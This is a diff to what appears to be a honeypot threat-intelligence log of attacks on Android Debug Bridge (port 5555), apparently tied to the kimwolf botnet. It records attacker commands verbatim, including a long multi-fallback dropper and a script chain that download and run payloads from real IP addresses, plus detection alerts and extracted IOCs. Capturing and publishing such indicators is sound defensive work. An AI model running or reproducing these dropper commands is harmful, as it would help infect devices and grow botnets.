@@ -1,5 +1,5 @@
 ABD Exploit Attack (MANTIS Honeypot //Threat Intelligence)
-
+These Attacks were captured on Port 5555 using a custom honeypot running protocl mimicing ADB. This protocol is heavily exploited by kimwolf botnet. 
 
 {
   "stage": "connect",
@@ -63,3 +63,41 @@ Lat/Lon	50.8897, 6.0563
   "command": "cd /data/local/tmp 2>/dev/null || cd /tmp 2>/dev/null || cd /cache; rm -f parm7 parm5 parm6 parm; mkdir -p /data/local/tmp 2>/dev/null; (wget -q -O parm7 http://45.148.120.23/bins/parm7 2>/dev/null || busybox wget -q -O parm7 http://45.148.120.23/bins/parm7 2>/dev/null || curl -fsSL -o parm7 http://45.148.120.23/bins/parm7 2>/dev/null || nc 45.148.120.23 3338 > parm7 2>/dev/null || toybox nc 45.148.120.23 3338 > parm7 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3338 > parm7\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3338 of=parm7 2>/dev/null); (wget -q -O parm5 http://45.148.120.23/bins/parm5 2>/dev/null || busybox wget -q -O parm5 http://45.148.120.23/bins/parm5 2>/dev/null || curl -fsSL -o parm5 http://45.148.120.23/bins/parm5 2>/dev/null || nc 45.148.120.23 3336 > parm5 2>/dev/null || toybox nc 45.148.120.23 3336 > parm5 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3336 > parm5\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3336 of=parm5 2>/dev/null); (wget -q -O parm6 http://45.148.120.23/bins/parm6 2>/dev/null || busybox wget -q -O parm6 http://45.148.120.23/bins/parm6 2>/dev/null || curl -fsSL -o parm6 http://45.148.120.23/bins/parm6 2>/dev/null || nc 45.148.120.23 3337 > parm6 2>/dev/null || toybox nc 45.148.120.23 3337 > parm6 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3337 > parm6\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3337 of=parm6 2>/dev/null); (wget -q -O parm http://45.148.120.23/bins/parm 2>/dev/null || busybox wget -q -O parm http://45.148.120.23/bins/parm 2>/dev/null || curl -fsSL -o parm http://45.148.120.23/bins/parm 2>/dev/null || nc 45.148.120.23 3335 > parm 2>/dev/null || toybox nc 45.148.120.23 3335 > parm 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3335 > parm\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3335 of=parm 2>/dev/null); [ -f parm7 ] && (chmod 777 parm7 2>/dev/null || chmod +x parm7 2>/dev/null); [ -f parm5 ] && (chmod 777 parm5 2>/dev/null || chmod +x parm5 2>/dev/null); [ -f parm6 ] && (chmod 777 parm6 2>/dev/null || chmod +x parm6 2>/dev/null); [ -f parm ] && (chmod 777 parm 2>/dev/null || chmod +x parm 2>/dev/null); [ -f parm7 ] && (su -c 'nohup /data/local/tmp/parm7 arm7 >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm7 arm7 >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm7 arm7 >/dev/null 2>&1 &); [ -f parm5 ] && (su -c 'nohup /data/local/tmp/parm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm5 >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm5 >/dev/null 2>&1 &); [ -f parm6 ] && (su -c 'nohup /data/local/tmp/parm6 >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm6 >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm6 >/dev/null 2>&1 &); [ -f parm ] && (su -c 'nohup /data/local/tmp/parm >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm >/dev/null 2>&1 &); [ -f parm7 ] && (su -c '/data/local/tmp/parm7 arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm7 arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm7 arm5 >/dev/null 2>&1 &) || [ -f parm5 ] && (su -c '/data/local/tmp/parm5 arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm5 arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm5 arm5 >/dev/null 2>&1 &) || [ -f parm6 ] && (su -c '/data/local/tmp/parm6 arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm6 arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm6 arm5 >/dev/null 2>&1 &) || [ -f parm ] && (su -c '/data/local/tmp/parm arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm arm5 >/dev/null 2>&1 &)",
   "mode": "exec"
 }
+Event Detail
+×
+adb command
+Event ID	832
+Session	c88f982e...
+Source IP	192.109.200.24
+Timestamp	2/23/2026, 9:37:10 PM
+{
+  "command": "cd /data/local/tmp/; busybox wget http://103.236.64.121/w.sh; sh w.sh; curl http://103.236.64.121/c.sh; sh c.sh; wget http://103.236.64.121/wget.sh; sh wget.sh; curl http://103.236.64.121/wget.sh; sh wget.sh; busybox wget http://103.236.64.121/wget.sh; sh wget.sh; busybox curl http://103.236.64.121/wget.sh; sh wget.sh",
+  "mode": "exec"
+}
+
+critical payload_ioc
+Alert ID	41
+Source IP	192.109.200.24
+Service	adb
+Timestamp	2/23/2026, 9:37:10 PM
+Event IDs	831
+Payload/IOC from 192.109.200.24: wget_download, curl_download, bash_script, sh_download, tmp_exec
+Payload Detections
+critical wget_download — wget download from remote URL
+critical curl_download — curl download from remote URL
+high bash_script — Direct shell script execution
+high sh_download — Download of .sh shell script
+medium tmp_exec — Execution from temporary directory
+Extracted IOCs
+URLS
+http://103.236.64.121/c.sh;
+http://103.236.64.121/wget.sh;
+http://103.236.64.121/w.sh;
+IPS
+103.236.64.121
+DOMAINS
+wget.sh
+c.sh
+w.sh
+Command Preview
+OPEN shell:cd /data/local/tmp/; busybox wget http://103.236.64.121/w.sh; sh w.sh; curl http://103.236.64.121/c.sh; sh c.sh; wget http://103.236.64.121/wget.sh; sh wget.sh; curl http://103.236.64.121/wget.sh; sh wget.sh; busybox wget http://103.236.64.121/wget.sh; sh wget.sh; busybox curl http://103.
